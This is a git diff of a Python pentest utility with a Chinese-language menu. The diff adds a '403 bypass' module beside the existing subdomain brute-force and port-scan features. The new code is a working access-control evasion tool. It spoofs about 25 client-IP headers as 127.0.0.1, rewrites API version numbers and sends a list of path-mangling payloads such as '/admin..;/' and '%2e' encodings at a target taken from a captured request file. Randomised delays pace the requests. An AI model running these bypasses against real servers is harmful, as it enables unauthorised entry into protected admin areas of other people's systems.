@@ -1,6 +1,8 @@
 import re
 import os
 import threading
+import time
+import random
 
 import requests
 
@@ -27,7 +29,7 @@ def tool_introduce():
 \033[33m支持功能:
     [1] 子域名扫描(爆破+爬虫)
     [2] 端口扫描(多线程)
-    [3] 敬请期待...\033[0m
+    [3] 403Bypass(读取请求包.txt)...\033[0m
     
 输入数字选择功能: '''
     return input(can_do)
@@ -278,10 +280,148 @@ class port_scaner:
         else:
             self.choice_model(self.PORT1000_PATH)
 
+'''
+403bypass
+'''
+class bypass403:
+
+    bypassHeaders = {
+   'X-Forwarded-For':'127.0.0.1',
+   'X-Forwarded':'127.0.0.1',
+   'Forwarded-For':'127.0.0.1',
+   'Forwarded':'127.0.0.1',
+   'X-Requested-With':'127.0.0.1',
+   'X-Forwarded-Proto':'127.0.0.1',
+   'X-Forwarded-Host':'127.0.0.1',
+   'X-remote-IP':'127.0.0.1',
+   'X-remote-addr':'127.0.0.1',
+   'True-Client-IP':'127.0.0.1',
+   'X-Client-IP':'127.0.0.1',
+   'Client-IP':'127.0.0.1',
+   'X-Real-IP':'127.0.0.1',
+   'Ali-CDN-Real-IP':'127.0.0.1',
+   'Cdn-Src-Ip':'127.0.0.1',
+   'Cdn-Real-Ip':'127.0.0.1',
+   'CF-Connecting-IP':'127.0.0.1',
+   'X-Cluster-Client-IP':'127.0.0.1',
+   'WL-Proxy-Client-IP':'127.0.0.1',
+   'Proxy-Client-IP':'127.0.0.1',
+   'Fastly-Client-Ip':'127.0.0.1',
+   'True-Client-Ip':'127.0.0.1',
+   'X-Originating-IP':'127.0.0.1',
+   'X-Host':'127.0.0.1',
+   'X-Custom-IP-Authorization':'127.0.0.1'
+}
+
+    bypassDirsearch = '''///phpmyadmin///
+//wp-admin//
+/admin
+/admin/
+/admin//
+//admin//
+/admin/*
+/admin/*/
+/admin/.
+/admin/./
+/./admin/./
+/admin/./.
+/admin/./.
+/admin?
+/admin??
+/admin???
+/admin..;/
+/admin/..;/
+/%2f/admin
+/%2e/admin
+/admin%20/
+/admin%09/
+/%20admin%20/'''.strip().split('\n')
+
+    def getRequest(self, url):
+        self.response = requests.get(url, headers=self.headers)
+        self.text = self.response.text
+        self.title = re.findall(r'<title>(.*?)</title>', self.text)[0]
+        self.code = self.response.status_code
+
+    def requestBag(self):
+        '''获取对应的请求头'''
+        with open('./请求包.txt','r') as f:
+            bypassBag = f.read().splitlines()
+            self.headers = {}
+
+            for i in bypassBag[1:]:
+                if len(i) == 0:
+                    break
+                i = i.split(":", 1)  # 只分隔一次
+                i[1] = i[1][1:]
+                self.headers[i[0]] = i[1]  # 有些数据包包含“因此这里只能用'
+
+        '''从请求包提取对应的 IP/域名 与 路径 且判断应使用http还是https'''
+        try:
+            self.url = 'https://' + self.headers['Host'] + re.findall(r'T (.*?) H', bypassBag[0])[0]
+            requests.get(self.url, headers=self.bypassHeaders)
+        except:
+            self.url = 'http://' + self.headers['Host'] + re.findall(r'T (.*?) H', bypassBag[0])[0]
+
+    def headerBypass(self):
+        '''请求头绕过'''
+        print(f'[*]对{self.url}使用请求头绕过:\n')
+        for i in self.bypassHeaders:
+            time.sleep(random.uniform(0.5, 2.5))
+            self.headers[i] = self.bypassHeaders[i]
+            self.getRequest(self.url)
+            del self.headers[i]#使用后就删除
+            print(f'{i}头绕过 \033[32m[状态码]\033[0m{self.response.status_code} \033[33m[标题]\033[0m{self.title}')
+            if self.response.status_code == 200:
+                print('\033[32m绕过成功!\033[0m')
+                return True
+        return False
+
+    def httpVersionBypass(self):
+        '''HTTP协议版本绕过'''
+
+        pass
+
+    def apiBypass(self):
+        '''api版本绕过'''
+        print(f'[*]对{self.url}使用api版本绕过:\n')
+        if 'v1' in self.url or 'v2' in self.url or 'v3' in self.url:
+            for i in ['v1', 'v2', 'v3']:
+                time.sleep(random.uniform(0.5, 2.5))
+                self.url = self.url.replace(re.findall('(v1|v2|v3)', self.url)[0], i)
+                self.getRequest(self.url)
+                print(f'{i}版本绕过 \033[32m[状态码]\033[0m{self.code} \033[33m[标题]\033[0m{re.findall(r'<title>(.*?)</title>', self.text)[0]}')
+                if self.code == 200:
+                    print('\033[32m绕过成功!\033[0m')
+                    return True
+        else:
+            print(f'{self.url}没有api版本号')
+        return False
+
+    def dirsearchBypass(self):
+        '''路径绕过'''
+        print(f'[*]对{self.url}使用路径绕过:\n')
+        if self.url.endswith('/'):
+            self.url = self.url[:-1]
+        print(self.url)
+        try:
+            urlEndDirsearch = self.url.split('/')[-1]
+            for i in self.bypassDirsearch:
+                time.sleep(random.uniform(0.5, 2.5))
+                i = i.replace('admin', urlEndDirsearch)
+                url = self.url.replace('/' + urlEndDirsearch, i)
+                self.getRequest(url)
+                print(f'{url}路径绕过 \033[32m[状态码]\033[0m{self.code} \033[33m[标题]\033[0m{re.findall(r'<title>(.*?)</title>', self.text)[0]}')
+                if self.code == 200:
+                    print('\033[32m绕过成功!\033[0m')
+                    return True
+        except:
+            return False
+
 # 加载介绍
 action = tool_introduce()
 
-# yanxi-info
+# 子域名收集
 if action == "1":
     subdomain_blast = subdomain_blast()
     subdomain_blast.load_dictionary()# 读取字典
@@ -292,7 +432,7 @@ if action == "1":
     subdomain_blast.thread(domain)# 开始爆破
     subdomain_blast.extractURL(domain)# 从源码中提取不重复的子域名并探活
     subdomain_blast.check_timeoutSubdomain(domain)# 对超时子域名进行二次检测
-#端口扫描
+# 端口扫描
 if action == "2":
     port_scaner = port_scaner()
     port_scaner.config()# 加载配置
@@ -300,5 +440,18 @@ if action == "2":
     ip = input("    \033[92m输入域名或IP，例:www.google.cn 或 127.0.0.1\033[0m\n")
     port_scaner.clean_file(ip)# 清理对应的文件
     port_scaner.run_port(ip)# 开始扫描端口
+# 403bypass
+if action == "3":
+    bypass403 = bypass403()
+    with open('./请求包.txt', 'r') as f:
+        test = f.read()
+    if not len(test):
+        print('\033[31m[!]请求包.txt内容为空\033[0m')
+    else:
+        bypass403.requestBag()
+        # 满足一项即可
+        if  bypass403.headerBypass() or bypass403.apiBypass() or bypass403.dirsearchBypass():
+            pass
+    # bypass403.httpVersionBypass()
 
 input("[+]按回车结束...")
